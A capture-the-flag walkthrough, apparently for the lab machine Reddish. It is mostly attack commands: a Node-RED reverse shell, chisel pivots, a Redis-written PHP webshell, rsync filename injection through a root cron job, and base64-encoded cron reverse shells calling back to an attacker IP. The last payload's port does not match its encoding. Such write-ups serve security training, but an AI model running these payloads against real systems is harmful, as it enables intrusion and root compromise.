# Attack Path

First enumerate the open ports and services

```bash
rustscan -a 10.129.122.237

sudo nmap -sC -sV -p 1880 -oA nmap/reddish 10.129.122.237
```

Only 1 port is open and upon visiting the site we get a cannot /get error. We use http verb tampering and we got a response

```bash

{"id":"c811816e50d58bd34204067b8ba3ae80","ip":"::ffff:10.10.14.132","path":"/red/{id}"}
```

Visiting the site lead us to a node red site. Let’s build a reverse shell and deploy it

![image.png]({{ site.baseurl }}/assets/reddish/image.png)

Connect one tcp box to exec, then another to TCP that replies:

![image.png]({{ site.baseurl }}/assets/reddish/image%201.png)

We have a root shell now, although we cannot traverse out of the directory. Let’s upgrade this to a real reverse shell. Enter this on your shell and have a nc listening port on 4443

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.132/4443 0>&1"
```

We got a reverse shell. Now let’s enumerate what’s on the system with LinEnum.

First start a listening port hosting the script

```bash
nc -lvp 1234 < /home/billy/tools/LinEnum.sh
```

Now get the script and execute it

```bash
wget http://10.10.14.132:1234/LinEnum.sh
```

If wget or curl is not available, try:

```bash
bash -c "cat < /dev/tcp/10.10.14.132/1234 > /dev/shm/LinEnum.sh"
```

Then navigate to the installed directory and run

```bash
bash LinEnum.sh

```

It seems we are inside a docker. Checking the ip address of the shell we get

```bash
ip addr

result:
172.18.0.2/16
172.19.0.4/16
```

We can send a static nmap binary and try to find the other host. First locate static_nmap or download from here: [https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

Now start a listening port

```bash
nc -lnvp 1234 < static_nmap
```

Now download the binary

```bash
bash -c "cat < /dev/tcp/10.10.14.132/1234 > /tmp/nmap"
```

Now make a simple ping sweep script to find other hosts on the network. 

```bash
nmap -sn 172.19.0.0/24 -v

result:
Nmap scan report for 172.19.0.1

172.19.0.1   
172.19.0.2
172.19.0.3
```

Alternatively, we can do:

```bash
for i in $(seq 254); do ping 172.19.0.$i -c1 -W1 & done | grep from

result:
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.075 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.080 ms
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.056 ms
```

Now let’s do a port sweep and see which ports are opened:

```bash
for port in 22 25 80 443 8080 8443; do 
(echo hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2>/dev/null
done

result:
80
```

Let’s try to use chisel for port forwarding since ssh is not available. First download chisel on host. And shrink it down as small as possible

```bash
git clone <repo>
go build
go build -ldflags="-s -w"
upx brute chisel
```

Now start the listening port to transfer the file

```bash
nc -lnvp 1234 < /home/billy/tools/chisel/chisel
```

Now grab the binary

```bash
bash -c "cat < /dev/tcp/10.10.14.132/1234 > /tmp/chisel"

md5sum  /home/billy/tools/chisel/chisel
md5sum /tmp/chisel   #they are the same
```

Chisel is a reverse pivot, our attack box acts as the server

![image.png]({{ site.baseurl }}/assets/reddish/image%202.png)

Now to set up chisel:

```bash
On our attack host:
./chisel server -p 8110 -reverse -v

On the pivot host:
/tmp/chisel client 10.10.14.132:8110 R:127.0.0.1:8111:172.19.0.3:80
```

- There was an issue with the GLIB_C with the latest version, went and downloaded the latest 2018 amd version then used upx on it to compress. It still worked.

Now we can browse from our attack box

```bash
http://localhost:8111
```

![image.png]({{ site.baseurl }}/assets/reddish/image%203.png)

We also find a backup function but however it the web does not load:

```bash
function backupDatabase() {
								$.ajax({
										url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
										cache: false,
										dataType: "text",
										success: function (data) {
											console.log("Database saved:", data);
										},
										error: function () {
										}
								});
						}
```

Let’s have another reverse shell so we can scan the other machine’s port

```bash
attack host:
nc -lnvp 7001

pivot host:
bash -c "bash -i >& /dev/tcp/10.10.14.132/7001 0>&1"

```

port sweep

```bash
for port in $(seq 1 65535); do
(echo hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2>/dev/null
done

result:
6379
```

Now set up another reverse pivot with chisel

```bash
On pivot host:
/tmp/chisel client 10.10.14.132:8110 R:127.0.0.1:6379:172.19.0.2:6379
```

Now we can scan for what kind of service it is:

```bash
sudo nmap -sC -sV -p 8112 localhost

result:
PORT     STATE SERVICE VERSION
8112/tcp open  redis   Redis key-value store
```

Now search on Google redis remote command execution; [https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)

Let’s test if there is authentication for redis

```bash
telnet localhost 6379
echo "Hey no AUTH required!"

result:
Hey no AUTH required!

```

Looks like there is no authentication. Let’s connect to redis and look through the database. There are nothing on the database but since we have all permission, we can write a simple webshell and attempt to visit the page. First let’s connect with redis-cli:

```bash
redis-cli -h localhost -p 6379
flushall
set shell "<? system($_REQUEST['cmd']); ?>"
config set dbfilename shell.php
config set dir /var/www/html
save

#the machine automatically cleans up the file after a while, just type save again
```

Now we visit the site with cmd parameter set to whoami; it worked:

![image.png]({{ site.baseurl }}/assets/reddish/image%204.png)

Let’s capture the request on burp so it’s easier to send commands. Upon trying to set up a reverse shell, we realised this machine cannot talk to our network.

```bash
ping -c1 10.10.14.132  #no result
```

However, we can talk to the webshell from our inital foothold; let’ start a local pivot.

![image.png]({{ site.baseurl }}/assets/reddish/image%205.png)

On the webshell

```bash

pivot host:
/tmp/chisel client 10.10.14.132:8110 9110:127.0.0.1:7001

#client is at first IP:PORT, anything sent to webshell localhost to port 9110 will be forwarded to client's 7001

attack host:
nc -lnvp 7001

cmd:
bash -c "bash -i >& /dev/tcp/172.19.0.4/9110 0>&1"  #Ctrl+U to url-encode it
```

We now have a www-data shell. Let’s check in the / dir to see if there’s anything unusual. We see a backup directory, upon catting it

```bash
cat backup.sh

result:
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

It seems we can use rysnc. Let’s check GTFObins if rsync can be used to escalate our privilege to root. We also need to check if [backup.sh](http://backup.sh) is executed by root. To be thorough, let’s run [LinEnum.s](http://LinEnum.sj)h on it. Again, create another port in chisel on the webshell

```bash
pivot:
/tmp/chisel client 10.10.14.132:8110 9111:127.0.0.1:7002

attack:
nc -lnvp 7002 < /home/billy/tools/LinEnum.sh

web:
cat < /dev/tcp/172.19.0.4/9111 > /tmp/linenum.sh
```

Now we can run it

```bash
chmod +x linenum.sh
bash linenum.sh

result:
Again we are in a docker envrionment. We find we have permission to read the backup script in cron jobs:
/etc/cron.d:                                                                                                                                              
total 16                                                                                                                                                  
drwxr-xr-x 1 root root 4096 Jul 15  2018 .                                                                                                                
drwxr-xr-x 1 root root 4096 Jul 15  2018 ..                                                                                                               
-rw-r--r-- 1 root root  102 Jun 11  2015 .placeholder                                                                                                     
-rw-r--r-- 1 root root   38 May  4  2018 backup 
```

Let’s read it

```bash
*/3 * * * * root sh /backup/backup.sh

#backup.sh is executed by root every 3 minutes
```

Now, we now the [backup.sh](http://backup.sh) script gets executed every 3 minutes, the script syncs rdb files from directory /var/www/html/f187a0ec71ce99642e4f0afbd441a68b. We can force it to execute a script as root e.g. reverse shell?

First create the script as a rdb file on attack host:

```bash
#!/bin/sh
cp /bin/dash /tmp/priv_esc
chmod 4755 /tmp/priv_esc

#we use dash as we can set this binary with SUID.
```

Now transfer it to the www host; easiest way is base64

```bash
base64 run.rdb -w 0

IyEvYmluL3NoCmNwIC9iaW4vZGFzaCAvdG1wL3ByaXZfZXNjCmNobW9kIDQ3NTUgL3RtcC9wcml2X2VzYwo=

on www host:
echo IyEvYmluL3NoCmNwIC9iaW4vZGFzaCAvdG1wL3ByaXZfZXNjCmNobW9kIDQ3NTUgL3RtcC9wcml2X2VzYwo= | base64 -d > /tmp/run.rdb

#Now cat it to see if it matches the original content.
```

Now we can utilise the [backup.sh](http://backup.sh) by naming another file the command to execute our exploit

```bash
cd /var/www/html
touch -- 'f187a0ec71ce99642e4f0afbd441a68b/-e sh run.rdb'
cp /tmp/run.rdb f18*/

#A reminder of backup.sh
rsync -a *.rdb rsync://backup:873/src/rdb/

#Therefore the command that will be ran based on our file name:
rsync -a '-e "sh run.rdb"' rsync://backup:873/src/rdb/

#to check on the time
date
```

Another way is to let is execute a reverse shell

```bash
#!/bin/sh

bash -c "bash -i >& /dev/tcp/172.19.0.4/1234 0>&1"

#save it to a file then base64 encode it
base64 reverse.rdb -w 0

result:

IyEvYmluL3NoCmJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE5LjAuNC8xMjM0IDA+JjEiCg==

on www:
echo IyEvYmluL3NoCmJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE5LjAuNC8xMjM0IDA+JjEiCg== | base64 -d > reverse.rdb
```

We need to set up the listening port on pivot host before hand

```bash
pivot:
chisel client 10.10.14.132:8110 1234:127.0.0.1:7003

attack:
nc -lnvp 7003
```

On www:

```bash
cd /var/www/html
touch -- 'f187a0ec71ce99642e4f0afbd441a68b/-e sh reverse.rdb'
cp /tmp/reverse.rdb f18*/

```

We have gotten reverse shell. With root permission, we can also now rsync the shadow file

```bash
rsync -a rsync://backup:873/src/etc/shadow .
```

It does not contain any password hashes. From the backup script, we also know the script connects to backup, but looking in the /etc/hosts file we do not see backup. Let’s try pinging it

```bash
ping -c1 backup

result:
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2): icmp_seq=1 ttl=64 time=0.050 ms
```

Now we know backup is at 172.20.0.2

Let’s send a cronjob to backup and let it execute a reverse shell so we can catch it. Before that, we have to set up chisel port forwarding again. We need backup to connect to www, which then connects to node red (pivot), which then connects back to us. First transfer chisel to www:

```bash
attack:
nc -lnvp 1235 < chisel

pivot:
/tmp/chisel client 10.10.14.132:8110 1235:127.0.0.1:1235

www:
bash -c "cat < /dev/tcp/172.19.0.4/1235 > /tmp/chisel"

```

```bash
pivot:
/tmp/chisel client 10.10.14.132:8110 8150:127.0.0.1:8110
#sets up for anything node red receives from port 8150 gets forwarded to 8110

www:
/tmp/chisel client 172.19.0.4:8150 8051:127.0.0.1:9005
#sets up anything from www receives from port 8051 and forward it to port 9005 (this would be our kali box)
```

Now we have the listening port set up we have to try and get the backup server to execute our script. From rsync, we know we can transfer files to and from the server, so let’s make a cronjob that will connect to us.

```bash
echo "bash -c 'bash -i >& /dev/tcp/172.20.0.3/8051 0>&1'" | base64 

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4zLzgwNTEgMD4mMScK

echo "* * * * * root echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4zLzgwNTEgMD4mMScK | base64 -d | bash" > clean
```

Now we send the file over and hopefully the server executes it.

```bash
on www:
rsync -avp clean rsync://backup:873/src/etc/cron.d/clean
```

We got root shell in backup. We check the ip, there seem to no other subnets. Let’s again transfer LinEnum, this time to backup

```bash
On www:
/tmp/chisel client 172.19.0.4:8150 1236:127.0.0.1:1236

on attack
nc -lnvp 1236 < /home/billy/tools/LinEnum.sh

on backup:
cat < /dev/tcp/172.20.0.3/1236 > linenum.sh

chmod 777 linenum.sh
./linenum.sh
```

We find nothing of interest. Let’s just go through enumerating interesting files, as we are root, we don’t really care for escalating privileges. We list mountable drives:

```bash
lsblk

result:
sda      8:0    0    7G  0 disk 
|-sda2   8:2    0  5.5G  0 part /etc/hosts
|-sda3   8:3    0    1G  0 part [SWAP]
`-sda1   8:1    0  512M  0 part

#let's create dirs so we can mounnt all and see
mkdir sda{1,2,3}

mount /dev/sda1 sda1
mount /dev/sda2 sda2
mount /dev/sda3 sda3
```

And we find root.txt in sda2/root/

Now we can attempt to get reverse shell from what seems to be the main host. So we do  not need chisel to do another port forward and exploit the cronjobs. First go into the sda2 directory then:

```bash
cd sda2/etc/cron.d

echo 'bash >& /dev/tcp/10.10.14.132/10509 0>&1' | base64

YmFzaCA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzIvMTA1MDYgMD4mMQo=

echo "* * * * * root echo YmFzaCA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMzIvMTA1MDYgMD4mMQo=K | base64 -d | bash" > runme
```
